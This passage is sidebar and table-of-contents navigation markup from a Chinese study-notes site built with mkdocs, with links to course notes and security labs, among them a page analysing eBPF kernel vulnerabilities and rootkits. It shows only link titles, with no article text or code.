</a>
</li>
</ul>
</nav>
</li>
</ul>
</nav>
</li>
<li class="md-nav__item md-nav__item--nested">
<input class="md-nav__toggle md-toggle" id="__nav_2_3_3" type="checkbox"/>
<div class="md-nav__link md-nav__container">
<a class="md-nav__link" href="../../../cs/system/cs2/">
<span class="md-ellipsis">
    计算机系统 II
    
  </span>
</a>
<label class="md-nav__link" for="__nav_2_3_3" id="__nav_2_3_3_label" tabindex="0">
<span class="md-nav__icon md-icon"></span>
</label>
</div>
<nav aria-expanded="false" aria-labelledby="__nav_2_3_3_label" class="md-nav" data-md-level="3">
<label class="md-nav__title" for="__nav_2_3_3">
<span class="md-nav__icon md-icon"></span>
            计算机系统 II
          </label>
<ul class="md-nav__list" data-md-scrollfix="">
<li class="md-nav__item">
<a class="md-nav__link" href="../../../cs/system/cs2/topic1/">
<span class="md-ellipsis">
    流水线 CPU
    
  </span>
</a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="../../../cs/system/cs2/topic2/">
<span class="md-ellipsis">
    操作系统简介
    
  </span>
</a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="../../../cs/system/cs2/topic3/">
<span class="md-ellipsis">
    操作系统结构及系统调用
    
  </span>
</a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="../../../cs/system/cs2/topic4/">
<span class="md-ellipsis">
    进程与线程
    
  </span>
</a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="../../../cs/system/cs2/topic5/">
<span class="md-ellipsis">
    CPU 调度
    
  </span>
</a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="../../../cs/system/cs2/topic6/">
<span class="md-ellipsis">
    进程同步
    
  </span>
</a>
</li>
<li class="md-nav__item md-nav__item--nested">
<input class="md-nav__toggle md-toggle" id="__nav_2_3_3_8" type="checkbox"/>
<label class="md-nav__link" for="__nav_2_3_3_8" id="__nav_2_3_3_8_label" tabindex="0">
<span class="md-ellipsis">
    系统 II 实验部分
    
  </span>
<span class="md-nav__icon md-icon"></span>
</label>
<nav aria-expanded="false" aria-labelledby="__nav_2_3_3_8_label" class="md-nav" data-md-level="4">
<label class="md-nav__title" for="__nav_2_3_3_8">
<span class="md-nav__icon md-icon"></span>
            系统 II 实验部分
          </label>
<ul class="md-nav__list" data-md-scrollfix="">
<li class="md-nav__item">
<a class="md-nav__link" href="../../../cs/system/cs2/lab1/">
<span class="md-ellipsis">
    系统 II lab1
    
  </span>
</a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="../../../cs/system/cs2/lab2/">
<span class="md-ellipsis">
    系统 II lab2
    
  </span>
</a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="../../../cs/system/cs2/lab7/">
<span class="md-ellipsis">
    系统 II lab7
    
  </span>
</a>
</li>
</ul>
</nav>
</li>
</ul>
</nav>
</li>
<li class="md-nav__item md-nav__item--nested">
<input class="md-nav__toggle md-toggle" id="__nav_2_3_4" type="checkbox"/>
<div class="md-nav__link md-nav__container">
<a class="md-nav__link" href="../../../cs/system/cs3/">
<span class="md-ellipsis">
    计算机系统 III
    
  </span>
</a>
<label class="md-nav__link" for="__nav_2_3_4" id="__nav_2_3_4_label" tabindex="0">
<span class="md-nav__icon md-icon"></span>
</label>
</div>
<nav aria-expanded="false" aria-labelledby="__nav_2_3_4_label" class="md-nav" data-md-level="3">
<label class="md-nav__title" for="__nav_2_3_4">
<span class="md-nav__icon md-icon"></span>
            计算机系统 III
          </label>
<ul class="md-nav__list" data-md-scrollfix="">
<li class="md-nav__item">
<a class="md-nav__link" href="../../../cs/system/cs3/topic1/">
<span class="md-ellipsis">
    系统量化研究方法
    
  </span>
</a>
</li>
<li class="md-nav__item md-nav__item--nested">
<input class="md-nav__toggle md-toggle" id="__nav_2_3_4_3" type="checkbox"/>
<label class="md-nav__link" for="__nav_2_3_4_3" id="__nav_2_3_4_3_label" tabindex="0">
<span class="md-ellipsis">
    系统 III 实验部分
    
  </span>
<span class="md-nav__icon md-icon"></span>
</label>
<nav aria-expanded="false" aria-labelledby="__nav_2_3_4_3_label" class="md-nav" data-md-level="4">
<label class="md-nav__title" for="__nav_2_3_4_3">
<span class="md-nav__icon md-icon"></span>
            系统 III 实验部分
          </label>
<ul class="md-nav__list" data-md-scrollfix="">
<li class="md-nav__item">
<a class="md-nav__link" href="../../../cs/system/cs3/lab1/">
<span class="md-ellipsis">
    系统 III lab1
    
  </span>
</a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="../../../cs/system/cs3/lab2/">
<span class="md-ellipsis">
    系统 III lab2
    
  </span>
</a>
</li>
</ul>
</nav>
</li>
</ul>
</nav>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="../../../cs/system/pa/">
<span class="md-ellipsis">
    ICS PA 实验纪实
    
  </span>
</a>
</li>
</ul>
</nav>
</li>
<li class="md-nav__item md-nav__item--nested">
<input class="md-nav__toggle md-toggle" id="__nav_2_4" type="checkbox"/>
<label class="md-nav__link" for="__nav_2_4" id="__nav_2_4_label" tabindex="0">
<span class="md-ellipsis">
    算法相关
    
  </span>
<span class="md-nav__icon md-icon"></span>
</label>
<nav aria-expanded="false" aria-labelledby="__nav_2_4_label" class="md-nav" data-md-level="2">
<label class="md-nav__title" for="__nav_2_4">
<span class="md-nav__icon md-icon"></span>
            算法相关
          </label>
<ul class="md-nav__list" data-md-scrollfix="">
<li class="md-nav__item md-nav__item--nested">
<input class="md-nav__toggle md-toggle" id="__nav_2_4_1" type="checkbox"/>
<div class="md-nav__link md-nav__container">
<a class="md-nav__link" href="../../../cs/algorithm/ds/">
<span class="md-ellipsis">
    数据结构基础
    
  </span>
</a>
<label class="md-nav__link" for="__nav_2_4_1" id="__nav_2_4_1_label" tabindex="0">
<span class="md-nav__icon md-icon"></span>
</label>
</div>
<nav aria-expanded="false" aria-labelledby="__nav_2_4_1_label" class="md-nav" data-md-level="3">
<label class="md-nav__title" for="__nav_2_4_1">
<span class="md-nav__icon md-icon"></span>
            数据结构基础
          </label>
<ul class="md-nav__list" data-md-scrollfix="">
<li class="md-nav__item">
<a class="md-nav__link" href="../../../cs/algorithm/ds/topic1/">
<span class="md-ellipsis">
    算法分析基础
    
  </span>
</a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="../../../cs/algorithm/ds/summary1/">
<span class="md-ellipsis">
    基础数据结构
    
  </span>
</a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="../../../cs/algorithm/ds/summary2/">
<span class="md-ellipsis">
    排序与哈希
    
  </span>
</a>
</li>
</ul>
</nav>
</li>
</ul>
</nav>
</li>
<li class="md-nav__item md-nav__item--nested">
<input class="md-nav__toggle md-toggle" id="__nav_2_5" type="checkbox"/>
<label class="md-nav__link" for="__nav_2_5" id="__nav_2_5_label" tabindex="0">
<span class="md-ellipsis">
    人工智能相关
    
  </span>
<span class="md-nav__icon md-icon"></span>
</label>
<nav aria-expanded="false" aria-labelledby="__nav_2_5_label" class="md-nav" data-md-level="2">
<label class="md-nav__title" for="__nav_2_5">
<span class="md-nav__icon md-icon"></span>
            人工智能相关
          </label>
<ul class="md-nav__list" data-md-scrollfix="">
<li class="md-nav__item">
<a class="md-nav__link" href="../../../cs/ai/basic/">
<span class="md-ellipsis">
    人工智能基础
    
  </span>
</a>
</li>
</ul>
</nav>
</li>
<li class="md-nav__item md-nav__item--nested">
<input class="md-nav__toggle md-toggle" id="__nav_2_6" type="checkbox"/>
<label class="md-nav__link" for="__nav_2_6" id="__nav_2_6_label" tabindex="0">
<span class="md-ellipsis">
    高性能计算相关
    
  </span>
<span class="md-nav__icon md-icon"></span>
</label>
<nav aria-expanded="false" aria-labelledby="__nav_2_6_label" class="md-nav" data-md-level="2">
<label class="md-nav__title" for="__nav_2_6">
<span class="md-nav__icon md-icon"></span>
            高性能计算相关
          </label>
<ul class="md-nav__list" data-md-scrollfix="">
<li class="md-nav__item md-nav__item--nested">
<input class="md-nav__toggle md-toggle" id="__nav_2_6_1" type="checkbox"/>
<div class="md-nav__link md-nav__container">
<a class="md-nav__link" href="../../../cs/hpc/hpc101/">
<span class="md-ellipsis">
    HPC 101 超算小学期
    
  </span>
</a>
<label class="md-nav__link" for="__nav_2_6_1" id="__nav_2_6_1_label" tabindex="0">
<span class="md-nav__icon md-icon"></span>
</label>
</div>
<nav aria-expanded="false" aria-labelledby="__nav_2_6_1_label" class="md-nav" data-md-level="3">
<label class="md-nav__title" for="__nav_2_6_1">
<span class="md-nav__icon md-icon"></span>
            HPC 101 超算小学期
          </label>
<ul class="md-nav__list" data-md-scrollfix="">
<li class="md-nav__item">
<a class="md-nav__link" href="../../../cs/hpc/hpc101/vectorized/">
<span class="md-ellipsis">
    向量化计算
    
  </span>
</a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="../../../cs/hpc/hpc101/gpu/">
<span class="md-ellipsis">
    GPU 编程
    
  </span>
</a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="../../../cs/hpc/hpc101/openmp/">
<span class="md-ellipsis">
    OpenMP 基础
    
  </span>
</a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="../../../cs/hpc/hpc101/mpi/">
<span class="md-ellipsis">
    MPI 基础
    
  </span>
</a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="../../../cs/hpc/hpc101/ml/">
<span class="md-ellipsis">
    机器学习基础
    
  </span>
</a>
</li>
</ul>
</nav>
</li>
</ul>
</nav>
</li>
<li class="md-nav__item md-nav__item--nested">
<input class="md-nav__toggle md-toggle" id="__nav_2_7" type="checkbox"/>
<label class="md-nav__link" for="__nav_2_7" id="__nav_2_7_label" tabindex="0">
<span class="md-ellipsis">
    理论计算机相关
    
  </span>
<span class="md-nav__icon md-icon"></span>
</label>
<nav aria-expanded="false" aria-labelledby="__nav_2_7_label" class="md-nav" data-md-level="2">
<label class="md-nav__title" for="__nav_2_7">
<span class="md-nav__icon md-icon"></span>
            理论计算机相关
          </label>
<ul class="md-nav__list" data-md-scrollfix="">
<li class="md-nav__item md-nav__item--nested">
<input class="md-nav__toggle md-toggle" id="__nav_2_7_1" type="checkbox"/>
<div class="md-nav__link md-nav__container">
<a class="md-nav__link" href="../../../cs/tcs/toc/">
<span class="md-ellipsis">
    计算理论
    
  </span>
</a>
<label class="md-nav__link" for="__nav_2_7_1" id="__nav_2_7_1_label" tabindex="0">
<span class="md-nav__icon md-icon"></span>
</label>
</div>
<nav aria-expanded="false" aria-labelledby="__nav_2_7_1_label" class="md-nav" data-md-level="3">
<label class="md-nav__title" for="__nav_2_7_1">
<span class="md-nav__icon md-icon"></span>
            计算理论
          </label>
<ul class="md-nav__list" data-md-scrollfix="">
<li class="md-nav__item">
<a class="md-nav__link" href="../../../cs/tcs/toc/topic1/">
<span class="md-ellipsis">
    语言、自动机与正则表达式
    
  </span>
</a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="../../../cs/tcs/toc/topic2/">
<span class="md-ellipsis">
    上下文无关语言
    
  </span>
</a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="../../../cs/tcs/toc/topic3/">
<span class="md-ellipsis">
    图灵机理论基础
    
  </span>
</a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="../../../cs/tcs/toc/topic4/">
<span class="md-ellipsis">
    判定问题
    
  </span>
</a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="../../../cs/tcs/toc/topic5/">
<span class="md-ellipsis">
    函数可计算性
    
  </span>
</a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="../../../cs/tcs/toc/topic6/">
<span class="md-ellipsis">
    复杂度理论
    
  </span>
</a>
</li>
</ul>
</nav>
</li>
</ul>
</nav>
</li>
<li class="md-nav__item md-nav__item--nested">
<input class="md-nav__toggle md-toggle" id="__nav_2_8" type="checkbox"/>
<label class="md-nav__link" for="__nav_2_8" id="__nav_2_8_label" tabindex="0">
<span class="md-ellipsis">
    零散知识点
    
  </span>
<span class="md-nav__icon md-icon"></span>
</label>
<nav aria-expanded="false" aria-labelledby="__nav_2_8_label" class="md-nav" data-md-level="2">
<label class="md-nav__title" for="__nav_2_8">
<span class="md-nav__icon md-icon"></span>
            零散知识点
          </label>
<ul class="md-nav__list" data-md-scrollfix="">
<li class="md-nav__item">
<a class="md-nav__link" href="../../../cs/regex/">
<span class="md-ellipsis">
    正则表达式
    
  </span>
</a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="../../../cs/unicode/">
<span class="md-ellipsis">
    Unicode
    
  </span>
</a>
</li>
</ul>
</nav>
</li>
<li class="md-nav__item md-nav__item--nested">
<input class="md-nav__toggle md-toggle" id="__nav_2_9" type="checkbox"/>
<div class="md-nav__link md-nav__container">
<a class="md-nav__link" href="../../../cs/analysis/">
<span class="md-ellipsis">
    源码剖析
    
  </span>
</a>
<label class="md-nav__link" for="__nav_2_9" id="__nav_2_9_label" tabindex="0">
<span class="md-nav__icon md-icon"></span>
</label>
</div>
<nav aria-expanded="false" aria-labelledby="__nav_2_9_label" class="md-nav" data-md-level="2">
<label class="md-nav__title" for="__nav_2_9">
<span class="md-nav__icon md-icon"></span>
            源码剖析
          </label>
<ul class="md-nav__list" data-md-scrollfix="">
<li class="md-nav__item">
<a class="md-nav__link" href="../../../cs/analysis/mkdocs/">
<span class="md-ellipsis">
    mkdocs 源码剖析
    
  </span>
</a>
</li>
</ul>
</nav>
</li>
<li class="md-nav__item md-nav__item--nested">
<input class="md-nav__toggle md-toggle" id="__nav_2_10" type="checkbox"/>
<div class="md-nav__link md-nav__container">
<a class="md-nav__link" href="../../../cs/tools/">
<span class="md-ellipsis">
    工具相关
    
  </span>
</a>
<label class="md-nav__link" for="__nav_2_10" id="__nav_2_10_label" tabindex="0">
<span class="md-nav__icon md-icon"></span>
</label>
</div>
<nav aria-expanded="false" aria-labelledby="__nav_2_10_label" class="md-nav" data-md-level="2">
<label class="md-nav__title" for="__nav_2_10">
<span class="md-nav__icon md-icon"></span>
            工具相关
          </label>
<ul class="md-nav__list" data-md-scrollfix="">
<li class="md-nav__item">
<a class="md-nav__link" href="../../../cs/tools/toolbox/">
<span class="md-ellipsis">
    工具收集
    
  </span>
</a>
</li>
<li class="md-nav__item md-nav__item--nested">
<input class="md-nav__toggle md-toggle" id="__nav_2_10_3" type="checkbox"/>
<label class="md-nav__link" for="__nav_2_10_3" id="__nav_2_10_3_label" tabindex="0">
<span class="md-ellipsis">
    站点生成工具
    
  </span>
<span class="md-nav__icon md-icon"></span>
</label>
<nav aria-expanded="false" aria-labelledby="__nav_2_10_3_label" class="md-nav" data-md-level="3">
<label class="md-nav__title" for="__nav_2_10_3">
<span class="md-nav__icon md-icon"></span>
            站点生成工具
          </label>
<ul class="md-nav__list" data-md-scrollfix="">
<li class="md-nav__item">
<a class="md-nav__link" href="../../../cs/tools/mkdocs/">
<span class="md-ellipsis">
    mkdocs 使用记录
    
  </span>
</a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="../../../cs/tools/hexo/">
<span class="md-ellipsis">
    hexo 使用记录
    
  </span>
</a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="../../../cs/tools/sphinx/">
<span class="md-ellipsis">
    sphinx 使用记录
    
  </span>
</a>
</li>
</ul>
</nav>
</li>
</ul>
</nav>
</li>
</ul>
</nav>
</li>
<li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
<input checked="" class="md-nav__toggle md-toggle" id="__nav_3" type="checkbox"/>
<div class="md-nav__link md-nav__container">
<a class="md-nav__link" href="../../">
<span class="md-ellipsis">
    Security
    
  </span>
</a>
<label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="">
<span class="md-nav__icon md-icon"></span>
</label>
</div>
<nav aria-expanded="true" aria-labelledby="__nav_3_label" class="md-nav" data-md-level="1">
<label class="md-nav__title" for="__nav_3">
<span class="md-nav__icon md-icon"></span>
            Security
          </label>
<ul class="md-nav__list" data-md-scrollfix="">
<li class="md-nav__item md-nav__item--nested">
<input class="md-nav__toggle md-toggle" id="__nav_3_2" type="checkbox"/>
<div class="md-nav__link md-nav__container">
<a class="md-nav__link" href="../../crypto/">
<span class="md-ellipsis">
    密码学
    
  </span>
</a>
</div>
<nav aria-expanded="false" aria-labelledby="__nav_3_2_label" class="md-nav" data-md-level="2">
<label class="md-nav__title" for="__nav_3_2">
<span class="md-nav__icon md-icon"></span>
            密码学
          </label>
<ul class="md-nav__list" data-md-scrollfix="">
</ul>
</nav>
</li>
<li class="md-nav__item md-nav__item--nested">
<input class="md-nav__toggle md-toggle" id="__nav_3_3" type="checkbox"/>
<div class="md-nav__link md-nav__container">
<a class="md-nav__link" href="../../softsec/">
<span class="md-ellipsis">
    软件安全
    
  </span>
</a>
<label class="md-nav__link" for="__nav_3_3" id="__nav_3_3_label" tabindex="0">
<span class="md-nav__icon md-icon"></span>
</label>
</div>
<nav aria-expanded="false" aria-labelledby="__nav_3_3_label" class="md-nav" data-md-level="2">
<label class="md-nav__title" for="__nav_3_3">
<span class="md-nav__icon md-icon"></span>
            软件安全
          </label>
<ul class="md-nav__list" data-md-scrollfix="">
<li class="md-nav__item">
<a class="md-nav__link" href="../../softsec/lab1/">
<span class="md-ellipsis">
    软件安全 lab1
    
  </span>
</a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="../../softsec/lab2/">
<span class="md-ellipsis">
    软件安全 lab2
    
  </span>
</a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="../../softsec/lab3/">
<span class="md-ellipsis">
    软件安全 lab3
    
  </span>
</a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="../../softsec/lab4/">
<span class="md-ellipsis">
    软件安全 lab4
    
  </span>
</a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="../../softsec/final/">
<span class="md-ellipsis">
    软件安全 final lab
    
  </span>
</a>
</li>
</ul>
</nav>
</li>
<li class="md-nav__item md-nav__item--nested">
<input class="md-nav__toggle md-toggle" id="__nav_3_4" type="checkbox"/>
<div class="md-nav__link md-nav__container">
<a class="md-nav__link" href="../../netsec/">
<span class="md-ellipsis">
    网络安全
    
  </span>
</a>
<label class="md-nav__link" for="__nav_3_4" id="__nav_3_4_label" tabindex="0">
<span class="md-nav__icon md-icon"></span>
</label>
</div>
<nav aria-expanded="false" aria-labelledby="__nav_3_4_label" class="md-nav" data-md-level="2">
<label class="md-nav__title" for="__nav_3_4">
<span class="md-nav__icon md-icon"></span>
            网络安全
          </label>
<ul class="md-nav__list" data-md-scrollfix="">
<li class="md-nav__item">
<a class="md-nav__link" href="../../netsec/lab1/">
<span class="md-ellipsis">
    网络安全 lab1
    
  </span>
</a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="../../netsec/lab2/">
<span class="md-ellipsis">
    网络安全 lab2
    
  </span>
</a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="../../netsec/lab3/">
<span class="md-ellipsis">
    网络安全 lab3
    
  </span>
</a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="../../netsec/hw/">
<span class="md-ellipsis">
    网络安全理论作业
    
  </span>
</a>
</li>
</ul>
</nav>
</li>
<li class="md-nav__item md-nav__item--active md-nav__item--nested">
<input checked="" class="md-nav__toggle md-toggle" id="__nav_3_5" type="checkbox"/>
<div class="md-nav__link md-nav__container">
<a class="md-nav__link" href="../">
<span class="md-ellipsis">
    系统安全
    
  </span>
</a>
<label class="md-nav__link" for="__nav_3_5" id="__nav_3_5_label" tabindex="0">
<span class="md-nav__icon md-icon"></span>
</label>
</div>
<nav aria-expanded="true" aria-labelledby="__nav_3_5_label" class="md-nav" data-md-level="2">
<label class="md-nav__title" for="__nav_3_5">
<span class="md-nav__icon md-icon"></span>
            系统安全
          </label>
<ul class="md-nav__list" data-md-scrollfix="">
<li class="md-nav__item">
<a class="md-nav__link" href="../lab1/">
<span class="md-ellipsis">
    系统安全 lab1
    
  </span>
</a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="../lab2/">
<span class="md-ellipsis">
    系统安全 lab2
    
  </span>
</a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="../lab3/">
<span class="md-ellipsis">
    系统安全 lab3
    
  </span>
</a>
</li>
<li class="md-nav__item md-nav__item--active">
<input class="md-nav__toggle md-toggle" id="__toc" type="checkbox"/>
<label class="md-nav__link md-nav__link--active" for="__toc">
<span class="md-ellipsis">
    eBPF 简介与漏洞分析
    
  </span>
<span class="md-nav__icon md-icon"></span>
</label>
<a class="md-nav__link md-nav__link--active" href="./">
<span class="md-ellipsis">
    eBPF 简介与漏洞分析
    
  </span>
</a>
<nav aria-label="目录" class="md-nav md-nav--secondary">
<label class="md-nav__title" for="__toc">
<span class="md-nav__icon md-icon"></span>
      目录
    </label>
<ul class="md-nav__list" data-md-component="toc" data-md-scrollfix="">
<li class="md-nav__item">
<a class="md-nav__link" href="#ebpf_1">
<span class="md-ellipsis">
      eBPF 起源与简介
    </span>
</a>
<nav aria-label="eBPF 起源与简介" class="md-nav">
<ul class="md-nav__list">
<li class="md-nav__item">
<a class="md-nav__link" href="#bpf">
<span class="md-ellipsis">
      BPF
    </span>
</a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="#ebpf_2">
<span class="md-ellipsis">
      eBPF
    </span>
</a>
</li>
</ul>
</nav>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="#ebpf_3">
<span class="md-ellipsis">
      eBPF 原理与安全设计
    </span>
</a>
<nav aria-label="eBPF 原理与安全设计" class="md-nav">
<ul class="md-nav__list">
<li class="md-nav__item">
<a class="md-nav__link" href="#ebpf_4">
<span class="md-ellipsis">
      eBPF 运行逻辑
    </span>
</a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="#ebpf_5">
<span class="md-ellipsis">
      eBPF 安全设计
    </span>
</a>
</li>
</ul>
</nav>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="#ebpf_6">
<span class="md-ellipsis">
      eBPF 技术相关安全漏洞分析
    </span>
</a>
<nav aria-label="eBPF 技术相关安全漏洞分析" class="md-nav">
<ul class="md-nav__list">
<li class="md-nav__item">
<a class="md-nav__link" href="#cve-2020-8835">
<span class="md-ellipsis">
      CVE-2020-8835
    </span>
</a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="#cve-2020-27194">
<span class="md-ellipsis">
      CVE-2020-27194
    </span>
</a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="#cve-2021-3490">
<span class="md-ellipsis">
      CVE-2021-3490
    </span>
</a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="#cve-2022-23222">
<span class="md-ellipsis">
      CVE-2022-23222
    </span>
</a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="#ebpf_7">
<span class="md-ellipsis">
      eBPF 安全漏洞总结
    </span>
</a>
</li>
</ul>
</nav>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="#ebpf_8">
<span class="md-ellipsis">
      eBPF 漏洞提权利用分析
    </span>
</a>
<nav aria-label="eBPF 漏洞提权利用分析" class="md-nav">
<ul class="md-nav__list">
<li class="md-nav__item">
<a class="md-nav__link" href="#_1">
<span class="md-ellipsis">
      地址泄漏原理
    </span>
</a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="#_2">
<span class="md-ellipsis">
      任意地址读原理
    </span>
</a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="#_3">
<span class="md-ellipsis">
      任意地址写原理
    </span>
</a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="#exp">
<span class="md-ellipsis">
      exp 程序分析
    </span>
</a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="#_4">
<span class="md-ellipsis">
      利用结果
    </span>
</a>
</li>
</ul>
</nav>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="#ebpf-rootkit">
<span class="md-ellipsis">
      eBPF rootkit 安全威胁分析
    </span>
</a>
<nav aria-label="eBPF rootkit 安全威胁分析" class="md-nav">
<ul class="md-nav__list">
<li class="md-nav__item">
<a class="md-nav__link" href="#ebpf-rootkit_1">
<span class="md-ellipsis">
      eBPF rootkit 原理
    </span>
</a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="#bad-bpf">
<span class="md-ellipsis">
      bad-bpf 程序复现
    </span>
</a>
<nav aria-label="bad-bpf 程序复现" class="md-nav">
<ul class="md-nav__list">
<li class="md-nav__item">
<a class="md-nav__link" href="#_5">
<span class="md-ellipsis">
      隐藏进程
    </span>
</a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="#_6">
<span class="md-ellipsis">
      劫持新建进程
    </span>
</a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="#_7">
<span class="md-ellipsis">
      用户提权
    </span>
</a>
</li>
</ul>
</nav>
</li>
</ul>
</nav>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="#_8">
<span class="md-ellipsis">
      总结
    </span>
</a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="#_9">
<span class="md-ellipsis">
      参考文献及资料
    </span>
</a>
</li>
</ul>
</nav>
</li>
</ul>
</nav>
</li>
<li class="md-nav__item md-nav__item--nested">
<input class="md-nav__toggle md-toggle" id="__nav_3_6" type="checkbox"/>
<div class="md-nav__link md-nav__container">
<a class="md-nav__link" href="../../iotsec/">
<span class="md-ellipsis">
    无线与物联网安全
    
  </span>
</a>
<label class="md-nav__link" for="__nav_3_6" id="__nav_3_6_label" tabindex="0">
<span class="md-nav__icon md-icon"></span>
</label>
</div>
<nav aria-expanded="false" aria-labelledby="__nav_3_6_label" class="md-nav" data-md-level="2">
<label class="md-nav__title" for="__nav_3_6">
<span class="md-nav__icon md-icon"></span>
            无线与物联网安全
          </label>
<ul class="md-nav__list" data-md-scrollfix="">
<li class="md-nav__item">
<a class="md-nav__link" href="../../iotsec/lab1/">
<span class="md-ellipsis">
    物联网安全 lab1
    
  </span>
</a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="../../iotsec/lab2/">
<span class="md-ellipsis">
    物联网安全 lab2
    
  </span>
</a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="../../iotsec/lab3/">
<span class="md-ellipsis">
    物联网安全 lab3
    
  </span>
</a>
</li>
</ul>
</nav>
</li>
<li class="md-nav__item md-nav__item--nested">
<input class="md-nav__toggle md-toggle" id="__nav_3_7" type="checkbox"/>
<label class="md-nav__link" for="__nav_3_7" id="__nav_3_7_label" tabindex="0">
<span class="md-ellipsis">
    漏洞复现
    
  </span>
<span class="md-nav__icon md-icon"></span>
</label>
<nav aria-expanded="false" aria-labelledby="__nav_3_7_label" class="md-nav" data-md-level="2">
<label class="md-nav__title" for="__nav_3_7">
<span class="md-nav__icon md-icon"></span>
            漏洞复现
          </label>
<ul class="md-nav__list" data-md-scrollfix="">
<li class="md-nav__item">
<a class="md-nav__link" href="../../vulns/log4j/">
<span class="md-ellipsis">
    log4j 漏洞复现
    
  </span>
</a>
</li>
</ul>
</nav>
</li>
</ul>
</nav>
</li>
<li class="md-nav__item md-nav__item--nested">
<input class="md-nav__toggle md-toggle" id="__nav_4" type="checkbox"/>
<div class="md-nav__link md-nav__container">
<a class="md-nav__link" href="../../../devops/">
<span class="md-ellipsis">
    DevOps
    
  </span>
</a>
<label class="md-nav__link" for="__nav_4" id="__nav_4_label" tabindex="0">
<span class="md-nav__icon md-icon"></span>
</label>
</div>
<nav aria-expanded="false" aria-labelledby="__nav_4_label" class="md-nav" data-md-level="1">
<label class="md-nav__title" for="__nav_4">
<span class="md-nav__icon md-icon"></span>
            DevOps
          </label>
<ul class="md-nav__list" data-md-scrollfix="">
<li class="md-nav__item md-nav__item--nested">
<input class="md-nav__toggle md-toggle" id="__nav_4_2" type="checkbox"/>
<div class="md-nav__link md-nav__container">
<a class="md-nav__link" href="../../../devops/system/">
<span class="md-ellipsis">
    系统运维
    
  </span>
</a>
<label class="md-nav__link" for="__nav_4_2" id="__nav_4_2_label" tabindex="0">
<span class="md-nav__icon md-icon"></span>
</label>
</div>
<nav aria-expanded="false" aria-labelledby="__nav_4_2_label" class="md-nav" data-md-level="2">
<label class="md-nav__title" for="__nav_4_2">
<span class="md-nav__icon md-icon"></span>
            系统运维
          </label>
<ul class="md-nav__list" data-md-scrollfix="">
<li class="md-nav__item">
<a class="md-nav__link" href="../../../devops/system/shell/">
<span class="md-ellipsis">
    命令行 shell 配置
    
  </span>
</a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="../../../devops/system/git/">
<span class="md-ellipsis">
    Git 相关使用与配置
    
  </span>
</a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="../../../devops/system/docker/">
<span class="md-ellipsis">
    Docker 相关配置与技术
    
  </span>
</a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="../../../devops/system/gdb/">
<span class="md-ellipsis">
    gdb 相关使用备忘
    
  </span>
</a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="../../../devops/system/action/">
<span class="md-ellipsis">
    GitHub Action 基础与运用
    
  </span>
</a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="../../../devops/system/kvm/">
<span class="md-ellipsis">
    KVM 虚拟机基本用法
    
  </span>
</a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="../../../devops/system/nas/">
<span class="md-ellipsis">
    NAS 配置记录
    
  </span>
</a>
</li>
</ul>
</nav>
</li>
<li class="md-nav__item md-nav__item--nested">
<input class="md-nav__toggle md-toggle" id="__nav_4_3" type="checkbox"/>
<div class="md-nav__link md-nav__container">
<a class="md-nav__link" href="../../../devops/network/">
<span class="md-ellipsis">
    网络运维
    
  </span>
</a>
<label class="md-nav__link" for="__nav_4_3" id="__nav_4_3_label" tabindex="0">
<span class="md-nav__icon md-icon"></span>
</label>
</div>
